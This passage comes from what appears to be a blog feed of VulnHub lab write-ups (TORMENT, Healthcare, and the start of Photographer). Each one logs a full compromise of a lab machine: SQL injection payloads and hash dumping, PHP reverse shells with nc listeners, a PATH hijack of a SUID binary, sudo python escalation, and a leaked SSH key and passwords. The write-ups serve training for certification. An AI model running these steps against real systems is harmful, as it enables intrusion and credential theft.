nfs_acl139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp  open  imap        Dovecot imapd|_imap-capabilities: CAPABILITY445/tcp  open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)631/tcp  open  ipp         CUPS 2.2| http-methods: |_  Potentially risky methods: PUT| http-robots.txt: 1 disallowed entry |_/|_http-server-header: CUPS/2.2 IPP/2.1|_http-title: Home - CUPS 2.2.12049/tcp open  nfs_acl     3 (RPC #100227)6667/tcp open  irc         ngircd6668/tcp open  irc         ngircd6669/tcp open  irc         ngircdService Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -2h46m00s, deviation: 4h37m07s, median: -6m00s|_nbstat: NetBIOS name: TORMENT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.5.12-Debian)|   Computer name: torment|   NetBIOS computer name: TORMENT\\x00|   Domain name: \\x00|   FQDN: torment|_  System time: 2020-06-05T22:08:11+08:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2020-06-05T14:08:11|_  start_date: N/AFTP ReconFTP server allows Anonymous login to the server so we can check the files.$ftp 192.168.1.12Connected to 192.168.1.12.220 vsftpd (broken)Name (192.168.1.12:hitesh): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls -la200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x   11 ftp      ftp          4096 Sep 17 17:26 .drwxr-xr-x   11 ftp      ftp          4096 Sep 17 17:26 ..drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .cupsdrwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .ftpdrwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .imapdrwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .mysqldrwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .nfsdrwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ngircddrwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .sambadrwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .smtpdrwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ssh-rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0-rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz-rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0-rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz-rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz-rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz-rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz-rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.5.gz-rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz-rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.1.gz-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.2.gz-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.3.gz-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.4.gz-rw-r--r--    1 ftp      ftp        489389 Dec 28  2018 dpkg.status.5.gz-rw-r--r--    1 ftp      ftp        470278 Dec 27  2018 dpkg.status.6.gz-rw-------    1 ftp      ftp          1010 Dec 31  2018 group.bak-rw-------    1 ftp      ftp           840 Dec 31  2018 gshadow.bak-rw-------    1 ftp      ftp          2485 Dec 31  2018 passwd.bak-rw-------    1 ftp      ftp          1575 Dec 31  2018 shadow.bak226 Directory send OK.There are lots of files and hidden dir on server. I download all the files and checked one by one.We have id_rsa in .ssh and channels in .ngircd directory.$cat id_rsa -----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,C37F0C31D1560056EA1F9204EC405986U9X/cW7GIiI48TQAzUs5ozEQgexHKiFi2NcoADhs/ax/CTJvZh32k+izzW0mMzl1mo5HID0qNghIbVbRcN6Zv8cdJ/AhREjy25YZ68zA7GWoyfoch1K/XY0NEnNTchLfb6k5GEgu5jfQT+pAj1A6jQyzz4A4CGbvD+iEEJRX3qsTlAn6th6dniRORJggnVLBK4ONTeP4US7GSGTtOD+hwoyoR4zNQKT2Hn/WryoF7LdAXMwf1aNJJJ7YPz1YdSnUfxXscbOMlXuZ4ouawIVGeYeH85lmOh7aBy5MWsYq/vNC+2pVzVEkRfc6jug1UbdGhncWxfU92Q47lVuqtc4HPINynD2Q8rBlYrKsEbPqtLyCnBGM/T0Srzztj+IjXUD1SdbVLmxascquwnIyv2w55vjwJv5dKjLBmrDiY0Doc9YYCGi6cz1p9tsE+G+uRg0rhGuFXldsYEkoQcJ4iWjsYiqcwWWFfkN+A0rYXqqcDY+aqAy+jXkhyzfmUp3KBz9jCjR1+7KcmKvNXtjn8V+iv2Nwf+qc2YzBNkBWlwHhxIz6L8F3k3OkqnZUqPKCW2GaCNMcIYx3+Gde3aXpHXg4OFALV7y23N8A2h97VOqnnrnED46C39shkA8iiMNdH9mz87TWgw+wPLbWXJO7G5nJL0qciLV/Eo6atSof3FUx/4WX4fmYeg1Rdy0KgTC1NRGnVT/YnlBrNW3f7fdhk/YhHbcT9vCg9/Nm3hmzQX/FBP085SgeEA+ebNMzQwPmqcfbjGpMPdhD7iLmKPwQL3RFTVODjUyzsgJ6kz83aQd80qPClopqp4NFMLwATVpbN858d4Q0QQGrCRqu2SYaYmVhGo37BJXKE11y0JzWXOhiVLD0I9fBoHDmsKHN4Aw3lbVE/n+B0Qa1bIMGfXP7J4r7/+4trQCGi7ngVfhtygtg6j/HcoXDy9y15zrHZqKerWd66ApM1caan4T0FjqlqTOQsN5GmB9sBCu02VQ1QF3Z4FVA9oW+pkNFxAeKIddG1yLM5L1ePDgEYjik6vM1lE/65c7fNaO8dndMau4reUnPbTFqKsTA46uUaMyOV6S7nsyskHGcAXLEzvbC8ojK1Pg5Llok6f8YN+H7cP6vE1yCfx3oU3GdWV36AgBWLON8+WwcicoyqfW6E2I0xz5nlHoea/7szCNBI4wZmRI+GRcRgegQvG06QvdXNzjqdezbb4baEXRnMddmfjFSihlUhsKxLhCmbaJk5mG2oGLHQcOurvOUPh/qgRBfUf3PTntuUoa00+tGGaLYibDNb5eXQ39Bsjzm8BWG/dSK/Qq7UU4Bk2bTKikWQLazPAy482BsZpWImXt8ISmJqldgdrtnVvG3zoQBQpspZ6HTojheNazfD4zzvduQguOcKrCNICxoSRgAegRER+uxaLqNGz+6H+9sl7FYWalMa+VzjrEDU7PeZNgOj9PxLdKbstQLQxC/Zq6+7kYu2pHwqP2HcXmdJ9xYnptwkuqh5WGR82Zk+JkKwUBEQJmbVxjqWLjCV/CDA06z6VvrfrPo3xt/CoZkH66qcm9LCTcM3DsLs3UT4B7aH5wk4l5MmpVI4/mx2Dlv0Mkv-----END RSA PRIVATE KEY-----$cat channels channels:gamestormentedprinterSMB EnumerationI used smbmap and enum4linux but nothing intresting here.$smbmap -H 192.168.1.12[+] Guest session   \tIP: 192.168.1.12:445\tName: 192.168.1.12                                      $enum4linux 192.168.1.12Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 17 17:41:55 2020 ========================== |    Target Information    | ========================== Target ........... 192.168.1.12RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== |    Enumerating Workgroup/Domain on 192.168.1.12    | ==================================================== [+] Got domain/workgroup name: WORKGROUP ============================================ |    Nbtstat Information for 192.168.1.12    | ============================================ Looking up status of 192.168.1.12\tTORMENT         &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service\tTORMENT         &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service\tTORMENT         &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service\tWORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name\tWORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections\tMAC Address = 00-00-00-00-00-00 ===================================== |    Session Check on 192.168.1.12    | ===================================== [E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.Port 631 (ipp)We can access port 631 using a browser. In the /printers tab, under the queue name, we’ll get  some names which could be potential usernames.albertcherrltdavidedmundethanevagenevievegovindasamyjessicakennypatrickqinyiqiurolandsaraChecking vaild UsersNow we have total 15 users. To find out vaild users I used metasploit smtp module(auxiliary/scanner/smtp/smtp_enum) and got two users are vaild.msf6 &gt; use auxiliary/scanner/smtp/smtp_enummsf6 auxiliary(scanner/smtp/smtp_enum) &gt; set rhosts 192.168.1.12rhosts =&gt; 192.168.1.12msf6 auxiliary(scanner/smtp/smtp_enum) &gt; set user_file users.txtuser_file =&gt; users.txtmsf6 auxiliary(scanner/smtp/smtp_enum) &gt; run[*] 192.168.1.12:25       - 192.168.1.12:25 Banner: 220 TORMENT.localdomain ESMTP Postfix (Debian/GNU)[+] 192.168.1.12:25       - 192.168.1.12:25 Users found: patrick, qiu[*] 192.168.1.12:25       - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedTwo vaild users are:patrickqiuNgircdAfter finding users I tried to bruteforce ssh, ftp, http but no luck. So I fouced on Ngircd chat service. I use hexchat to access it.We need a password to log in. So I searched for the ngircd configuration file online and got a default password.wealllikedebianNow using password connect to the server. I used channels names to connect to server that we found during FTP recon./join #tormentedprinterI used above command to connect to tormentedprinter channel and found password.mostmachineshaveasupersecurekeyandalongpassphraseUser Patrick.Using the SSH key and password from the tormentedprinter channel we can log in into ssh.$chmod 600 id_rsa $ssh -i id_rsa patrick@192.168.1.12load pubkey \"id_rsa\": invalid formatEnter passphrase for key 'id_rsa': Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Sep 14 18:09:29 2020 from 192.168.1.2patrick@TORMENT:~$ User qiuAfter spending some time I found that the apache2.conf has read, write and execute permissions for all the users.patrick@TORMENT:~$ find /etc -type f -writable 2&gt;/dev/null/etc/apache2/apache2.confUsing apache2.conf file we can launch the shell as user qiu.  Add user qiu and group qiu in /etc/apache2/apache2.conf.  Upload php reverse in /var/www/html folder.    $nc -w 3 192.168.1.12 1234 &lt; shell.php        patrick@TORMENT:~$ nc -l -p 1234 &gt; /var/www/html/shell.php patrick@TORMENT:~$ ls /var/www/htmlindex.html  secret  shell.php  torment.jpg        Restart system    patrick@TORMENT:~$ sudo /bin/systemctl rebootpatrick@TORMENT:~$ Connection to 192.168.1.12 closed by remote host.Connection to 192.168.1.12 closed.        Setup listner and access shell using http://ip/shell.php┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/torrment/ftp]└──╼ $nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.1.2] from (UNKNOWN) [192.168.1.12] 56538Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux 06:12:34 up 0 min,  0 users,  load average: 2.75, 0.73, 0.25USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)/bin/sh: 0: can't access tty; job control turned off$ python -c 'import pty;pty.spawn(\"/bin/bash\")'qiu@TORMENT:/$ ^Z[1]+  Stopped                 nc -nvlp 4444┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/torrment/ftp]└──╼ $stty raw -echo┌─[hitesh@parrot]─[~/boxes/vulnhub/torrment/ftp]└──╼ $nc -nvlp 4444qiu@TORMENT:/$ PrivescI checked for the sudoer list and found that /usr/bin/python can be run with root privileges without any password.qiu@TORMENT:/$ sudo -lMatching Defaults entries for qiu on TORMENT:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser qiu may run the following commands on TORMENT:    (ALL) NOPASSWD: /usr/bin/python, /bin/systemctlqiu@TORMENT:/$ sudo /usr/bin/python -c 'import pty;pty.spawn(\"/bin/bash\")'root@TORMENT:/# Final Flagroot@TORMENT:~# cat author-secret.txt This is the fourth Linux box written successfully by this author.Unlike the first three, this had no MERCY, took some DEVELOPMENT and required a sheer ton of BRAVERY.Setting puzzles has been an author's joy, even though some of these puzzles may be rather mind-bending. The idea is that, even if we are repeatedly testing the basics, the basics can be morphed into so many different forms. The TORMENT box is a fine example.The privilege escalation, in particular, was inspired from what people would usually learn in Windows privilege escalation --- weak service permissions. In this case, this was extended to Linux through something a little different. Before you think this is fictitious, think for a second --- how many developers have you heard became too lazy to test new configurations, and so decided to chmod 777 themselves? Also, if they can't log in as root directly, they cannot as easily modify /var/www/html, so they'd come up with silly ideas there as well.Sigh, a New Year's eve disappeared from rushing out this box. But I think it is worth it.Happy 2019, and many more good years beyond!Soon I will be writing Windows boxes; these you may be able to find on Wizard-Labs, as a favour for a friend. Otherwise you can find me on my site. Root one of the earlier boxes I had to find out where this is.root@TORMENT:~# cat proof.txt Congrutulations on rooting TORMENT. I hope this box has been as fun for you as it has been for me. :-)Until then, try harder!"
  },
  
  {
    "title": "Healthcare Vulnhub Writeup",
    "url": "/posts/Healthcare-Writeup/",
    "categories": "vulnhub, OSCP-Like",
    "tags": "oscp, openemr, suid, sqli",
    "date": "2020-09-06 00:00:00 +0530",
    





    "snippet": "Healthcare is an OSCP-like box. It starts with finding hidden dir openemr. Using SQL injection vulnerability in the web application I dump the database credentials. I can log in to FTP because the user re-used the same credentials. I land a shell by uploading a shell to the server using FTP. Priv esc to root by exploiting a path hijack vulnerability in a SUID binary.Summary  Portscan  Finding the hidden dir openemr  Using sqlmap to dump creds  Uploading Shell via FTP  Initial Shell  Checking SUID  Privesc by hijacking the PATH of a SUID binaryPortscanPORT   STATE SERVICE VERSION21/tcp open  ftp     ProFTPD 1.3.3d80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))| http-robots.txt: 8 disallowed entries | /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ |_/all_our_e-mail_addresses /admin/ /|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)|_http-title: Coming Soon 2Service Info: OS: UnixGobusterGobuster with the wordlist dirbuster-medium.txt gives me nothing interesting But on changing the Wordlist to directory-list-2.3-big.txt Got a Dir Called /openemr. Thanks to the creator (v1n1v131r4) of the machine who helped me with this.$gobuster dir -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.1.9  ===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://192.168.1.9[+] Threads:        10[+] Wordlist:       /home/hitesh/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2020/09/06 20:24:10 Starting gobuster===============================================================/index (Status: 200)/images (Status: 301)/css (Status: 301)/js (Status: 301)/vendor (Status: 301)/favicon (Status: 200)/robots (Status: 200)/fonts (Status: 301)/gitweb (Status: 301)/phpMyAdmin (Status: 403)/server-status (Status: 403)/server-info (Status: 403)/openemr (Status: 301)OpenemrAs we can see above, when we opened the openemr directory on the browser, it redirected us to a login page where we have to enter the username and password. Since we don’t know any usernames or passwords yet, I tried some default username and password combinations on that login screen, but that didn’t work.Sql InjectionI started analyzing the website for vulnerabilities. I intercept the request in burp and found that it can be vulnerable to SQL injection (SQLi). This was done by adding a single quote(‘) in /openemr/interface/login/validateUser.php?u='. The website responded with an SQL error message, indicating that it might be vulnerable.I use sqlmap to enumeration more.sqlmap -u http://192.168.1.9/openemr/interface/login/validateUser.php?u=admin -D openemr -T users --dump       __H__ ___ ___[,]_____ ___ ___  {1.4.8#stable}|_ -| . [']     | .'| . ||___|_  [.]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 22:12:34 /2020-09-06/[22:12:35] [INFO] resuming back-end DBMS 'mysql' [22:12:35] [INFO] testing connection to the target URLyou have not declared cookie(s), while server wants to set its own ('OpenEMR=63a369aae71...8c445a0dd6'). Do you want to use those [Y/n] sqlmap resumed the following injection point(s) from stored session:---Parameter: u (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: u=admin' AND 4430=4430 AND 'Qdai'='Qdai    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: u=admin' AND (SELECT 1685 FROM(SELECT COUNT(*),CONCAT(0x71767a7071,(SELECT (ELT(1685=1685,1))),0x716b707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'mswE'='mswE    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: u=admin' AND (SELECT 7341 FROM (SELECT(SLEEP(5)))fEST) AND 'FSmY'='FSmY---[22:12:39] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0[22:12:39] [INFO] fetching columns for table 'users' in database 'openemr'[22:12:39] [INFO] fetching entries for table 'users' in database 'openemr'[22:12:39] [INFO] resumed: ''[22:12:39] [INFO] resumed: '1'[22:12:39] [INFO] resumed: ' '[22:12:39] [INFO] resumed: '1'[22:12:39] [INFO] resumed: ' '[22:12:39] [INFO] resumed: '3'......[22:12:39] [INFO] resumed: 'medical'[22:12:39] [INFO] resumed: ' '[22:12:39] [INFO] resumed: ' '[22:12:39] [INFO] resumed: ' '[22:12:39] [INFO] recognized possible password hashes in column 'password'do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] do you want to crack them via a dictionary-based attack? [Y/n/q] [22:12:42] [INFO] using hash method 'sha1_generic_passwd'[22:12:42] [INFO] resuming password 'ackbar' for hash '3863efef9ee2bfbc51ecdca359c6302bed1389e8' for user 'admin'[22:12:42] [INFO] resuming password 'medical' for hash 'ab24aed5a7c4ad45615cd7e0da816eea39e4895d' for user 'medical'I dump users table of database openemr and found 2 users with hashes.admin   : ackbarmedical : medicalUpload Shell with FTPFurther, I login to FTP using medical creds.$ftp 192.168.1.9Connected to 192.168.1.9.220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.168.1.9]Name (192.168.1.9:hitesh): medical331 Password required for medicalPassword:230 User medical logged inRemote system type is UNIX.Using binary mode to transfer files.ftp&gt; We have read-write permission to /var/www/html/openemr directory.ftp&gt; cd /var/www/html250 CWD command successfulftp&gt; ls200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x   2 root     root         4096 Oct 27  2011 addon-modulesdrwxr-xr-x   2 root     root         4096 Jan  7  2018 css-rw-r--r--   1 root     root         1406 Mar 19  2011 favicon.icodrwxr-xr-x   5 root     root         4096 Jan  7  2018 fontsdrwxr-xr-x   3 root     root         4096 Jul 29 21:31 images-rwxr-xr-x   1 root     root         5031 Jan  6  2018 index.htmldrwxr-xr-x   2 root     root         4096 Jan  7  2018 jsdrwxr-xr-x  21 medical  medical      4096 Sep  6 15:31 openemr-rw-r--r--   1 root     root          620 Mar 19  2011 robots.txtdrwxr-xr-x   8 root     root         4096 Jan  7  2018 vendor226 Transfer completeSo, let’s upload the reverse shell on box.ftp&gt; put shell.phplocal: shell.php remote: shell.php200 PORT command successful150 Opening BINARY mode data connection for shell.php226 Transfer complete5493 bytes sent in 0.34 secs (15.7194 kB/s)Reverse ShellAccess the reverse shell with url http://ip/openemr/shell.php and get the shell.$ curl http://192.168.1.9/openemr/shell.php$nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.1.2] from (UNKNOWN) [192.168.1.9] 42953Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux 10:01:29 up 19 min,  0 users,  load average: 1.00, 1.00, 0.74USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHATuid=479(apache) gid=416(apache) groups=416(apache)sh: no job control in this shellsh-4.1$ python -c 'import pty;pty.spawn(\"/bin/bash\")'python -c 'import pty;pty.spawn(\"/bin/bash\")'bash-4.1$ ^Z[1]+  Stopped                 nc -nvlp 4444┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/healthcare]└──╼ $stty raw -echo┌─[hitesh@parrot]─[~/boxes/vulnhub/healthcare]└──╼ $nc -nvlp 4444bash-4.1$ export TERM=xtermUser MedicalWe can use the password medical to su user medical.bash-4.1$ su - medicalsu - medicalPassword: medical[medical@localhost ~]$ Privesc to rootLooking at SUID files, /usr/bin/healthcheck stands out because it’s not a standard Linux binary.[medical@localhost ~]$ find / -perm -4000 2&gt;/dev/null/usr/libexec/pt_chown/usr/lib/ssh/ssh-keysign/usr/lib/polkit-resolve-exe-helper/usr/lib/polkit-1/polkit-agent-helper-1/usr/lib/chromium-browser/chrome-sandbox/usr/lib/polkit-grant-helper-pam/usr/lib/polkit-set-default-helper/usr/sbin/fileshareset/usr/sbin/traceroute6/usr/sbin/usernetctl/usr/sbin/userhelper/usr/bin/crontab/usr/bin/at/usr/bin/pumount/usr/bin/batch/usr/bin/expiry/usr/bin/newgrp/usr/bin/pkexec/usr/bin/wvdial/usr/bin/pmount/usr/bin/sperl5.10.1/usr/bin/gpgsm/usr/bin/gpasswd/usr/bin/chfn/usr/bin/su/usr/bin/passwd/usr/bin/gpg/usr/bin/healthcheck/usr/bin/Xwrapper/usr/bin/ping6/usr/bin/chsh/lib/dbus-1/dbus-daemon-launch-helper/sbin/pam_timestamp_check/bin/ping/bin/fusermount/bin/su/bin/mount/bin/umountThe program just seems to be running a bunch of standard linux programs like fdisk.[medical@localhost ~]$ strings /usr/bin/healthcheck /lib/ld-linux.so.2__gmon_start__libc.so.6_IO_stdin_usedsetuidsystemsetgid__libc_start_mainGLIBC_2.0PTRhp[^_]clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -hThe program is vulnerable because we control the PATH and the program doesn’t use the absolute path to execute the programs so we can execute anything we want as root. To get root I’ll just create a script that sets the SUID bit on /bin/bash, name it fdisk and call /usr/bin/healthcheck after setting the path to my current directory so it doesn’t execute the real fdisk program but my own script.[medical@localhost ~]$ echo \"/bin/bash\" &gt; fdisk[medical@localhost ~]$ chmod +x fdisk [medical@localhost ~]$ export PATH=/home/medical:$PATH[medical@localhost ~]$ echo $PATH/home/medical:/bin:/usr/bin:/usr/local/bin:/usr/bin/X11:/usr/games:/usr/lib/qt4/bin:/home/medical/bin[medical@localhost ~]$ /usr/bin/healthcheck System Health CheckScanning Systemsh: ifconfig: command not found[root@localhost ~]# Root Flag[root@localhost root]# cat root.txt██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██  ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██   ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██    ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██       ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██                                                                                                                                                                                                                                                     Thanks for Playing!Follow me at: http://v1n1v131r4.comroot hash: eaff25eaa9ffc8b62e3dfebf70e83a7b"
  },
  
  {
    "title": " Photographer: 1 Vulnhub Writeup",
    "url": "/posts/photographer-Writeup/",
    "categories": "vulnhub, OSCP-Like",
    "tags": "medium, koken, smb, suid, php7.2, oscp",
    "date": "2020-09-05 00:00:00 +0530",
    





    "snippet": "Photographer is an OSCP-like box. We found initial credentials for the Koken CMS by enumerating SMB shares. We upload a malicious php file to get a shell. In-home directory of daisa we found the user flag. We get root access by exploiting the php7.2 binary.Summary  Portscan  Finding SMB Shares  Logging to Koken CMS  Getting shell via File Upload Vulnerability.  User Flag  SUID  Root FlagPortscanPORT     STATE SERVICE     VERSION80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Photographer by v1n1v131r4139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Koken API error|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: Host: PHOTOGRAPHERHost script results:|_clock-skew: mean: 1h19m27s, deviation: 2h18m33s, median: -32s|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: photographer|   NetBIOS computer name: PHOTOGRAPHER\\x00|   Domain name: \\x00|   FQDN: photographer|_  System time: 2020-07-27T11:29:36-04:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2020-07-27T15:29:37|_  start_date: N/AWebsite on Port 80I don’t see any links or any html comments that might indicate what to do nextSMB reconI use smbmap to findout the shares which we can access without credentials.$smbmap -H 192.168.1.7[+] Guest session   \tIP: 192.168.1.7:445\tName: 192.168.1.7                                               Disk                                                  \tPermissions\tComment\t----                                                  \t-----------\t-------\tprint$                                            \tNO ACCESS\tPrinter Drivers\tsambashare                                        \tREAD ONLY\tSamba on Ubuntu\tIPC$                                              \tNO ACCESS\tIPC Service (photographer server (Samba, Ubuntu))We can access sambashare share.$smbclient //192.168.1.7/sambashareEnter WORKGROUP\\hitesh's password: Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Tue Jul 21 07:00:07 2020  ..                                  D        0  Tue Jul 21 15:14:25 2020  mailsent.txt                        N      503  Tue Jul 21 06:59:40 2020  wordpress.bkp.zip                   N 13930308  Tue Jul 21 06:52:23 2020\t\t278627392 blocks of size 1024. 264268400 blocks availablesmb: \\&gt; get mailsent.txtgetting file \\mailsent.txt of size 503 as mailsent.txt (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)smb: \\&gt; get wordpress.bkp.zip getting file \\wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (31345.2 KiloBytes/sec) (average 26467.5 KiloBytes/sec)Now we have two files mailsent.txt and wordpress.bkp.zip. The mailsent.txt have interesting information two emails address and one possible password.Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;Date: Mon, 20 Jul 2020 11:40:36 -0400From: Agi Clarence &lt;agi@photographer.com&gt;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0X-Accept-Language: en-us, enMIME-Version: 1.0To: Daisa Ahomi &lt;daisa@photographer.com&gt;Subject: To Do - Daisa Website'sContent-Type: text/plain; charset=us-ascii; format=flowedContent-Transfer-Encoding: 7bitHi Daisa!Your site is ready now.Don't forget your secret, my babygirl ;)Emails:    agi@photographer.com(agi)    daisa@photographer.com(daisa)Password:    babygirlWebsite on Port 8000Server running Koken CMS on port 8000. Koken CMS is a free website publishing system developed for photographers.Accessing Koken Admin Panel/admin contain Sign In page.Here I tried to log in with creds which we found in mailsent.txt and succeed.email : daisa@photographer.compass  : babygirlGetting ShellIn Koken we can upload the images. So try to 